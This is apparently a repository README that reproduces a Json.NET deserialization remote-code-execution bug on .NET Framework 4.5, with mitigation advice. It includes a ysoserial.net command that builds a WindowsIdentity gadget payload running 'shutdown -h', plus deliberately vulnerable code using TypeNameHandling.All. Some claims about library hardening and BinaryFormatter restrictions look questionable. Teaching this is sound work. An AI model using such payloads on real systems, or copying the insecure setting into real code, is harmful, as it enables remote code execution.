# OWASP-10-A08-software-and-data-integrity

Real use case scenarios of unsafe deserialization in .NET leveraging in YSoSerial.net payload generator

---

This repository documents the successful reproduction of a Remote Code Execution (RCE) vulnerability in **Newtonsoft.Json (Json.NET)** when deserializing untrusted data, specifically demonstrating that the official security patches in recent library versions (like **13.0.4**) are undermined by the permissive nature of older **.NET Framework** runtime environments (specifically tested on **.NET Framework 4.5**).

---

## 💡 The Problem: Patches vs. Runtime

Modern Json.NET versions contain a **hardened `SerializationBinder`** intended to block known dangerous "gadgets" like `WindowsIdentity` when `TypeNameHandling.All` is enabled. However, when the consuming application targets an older runtime—such as .NET Framework 4.5—the underlying Base Class Library (BCL) remains vulnerable and can be exploited by an advanced gadget chain like those generated by `ysoserial.net`.

**Key Finding:** The vulnerability is not in Json.NET 13.0.4's code *itself*, but in the **runtime's ability to complete the gadget chain**, bypassing the library's security checks. This risk persists for applications built on unsupported or older .NET Framework versions.

---

## 💥 Vulnerable Configuration Details

The successful RCE was achieved using the following specific setup:

| Component | Version Used | Status |
| :--- | :--- | :--- |
| **.NET Framework** | **4.5** (Observed to affect up to 4.8) | **Vulnerable Runtime** |
| **Serializer Library** | `Newtonsoft.Json` **13.0.4** | **Latest Version (Bypassed)** |
| **Gadget Tool** | `ysoserial.net` | **Payload Generator** |
| **Key Setting** | `TypeNameHandling.All` | **Required for Type Injection** |
| **Gadget Class** | `System.Security.Principal.WindowsIdentity` | **RCE Trigger** |

## 🛠️ Reproduction Details (The Fixes & Failures)

### 1. The `BinaryFormatter` Trap (Initial Failure)

* **Attempt:** Initially tried using `BinaryFormatter` payloads from `ysoserial.net` (e.g., `ClaimsIdentity`).
* **Outcome:** **Failed.**
* **Reason:** The `.NET` Framework has officially deprecated and restricted the use of `BinaryFormatter`. The modern runtime environment prevents its execution entirely, confirming that much of the older `ysoserial.net` documentation is now outdated.

### 2. The `WindowsIdentity` Payload (The Success)

* **Goal:** Execute code using the `WindowsIdentity` gadget and the **Json.NET formatter**.
* **Payload Command:**
    ```bash
    ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -c "shutdown -h" > "payload-use-case-2.txt"
    ```
* **Deserialization Code:** The vulnerable application code simply tries to deserialize the object with insecure settings.

    ```csharp
    // Program.cs snippet (assuming TypeNameHandling.All is set in settings)
    try
    {
        var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };
        var windowsIdentity = JsonConvert.DeserializeObject<WindowsIdentity>(serializedOutput, settings);
        
        // Note: The RCE executes during the DeserializeObject call itself, 
        // not necessarily on assignment.
    }
    catch (Exception ex)
    {
        // Handle failure/security exception
    }
    ```

* **Outcome:** **SUCCESS!** The command (`shutdown -h`) was executed, proving the RCE.

### 3. The Visual Studio 2022 Target Framework Nightmare

Running this legacy code in a modern IDE required significant manual work due to Microsoft removing support for old frameworks.

* **Problem:** VS 2022 cannot target **.NET Framework 4.5** by default.
* **Solution (Manual Fix):**
    1.  Manually download the `Microsoft.NETFramework.ReferenceAssemblies.net45` NuGet package.
    2.  Extract the assembly DLLs from the package.
    3.  Copy the contents of `build\.NETFramework\v4.5\` into:
        `C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.5`
* **Project File Configuration (`.csproj`):** The project file must explicitly state the target version:

    ```xml
    <Project Sdk="Microsoft.NET.Sdk">
      <PropertyGroup>
        <OutputType>Exe</OutputType>
    	<TargetFramework>net4.5</TargetFramework>
        <RootNamespace>OWASP_10_A08_software_and_data_integrity</RootNamespace>
      </PropertyGroup>

      <ItemGroup>
        <PackageReference Include="Newtonsoft.Json" Version="13.0.4" />
      </ItemGroup>
    </Project>
    ```

## ⚠️ Mitigation Recommendations

The vulnerability is caused by enabling type fidelity (`TypeNameHandling`) for untrusted input. The only robust mitigation is to **NEVER enable this setting** unless you control and trust the entire input stream.

* **DO NOT:** Set `TypeNameHandling` to `All`, `Objects`, or `Auto` for any data received from external sources.
* **DO:** Set `TypeNameHandling = TypeNameHandling.None` (the default) or, if polymorphism is absolutely required, implement a **custom `SerializationBinder`** that strictly allow-lists only the expected types.
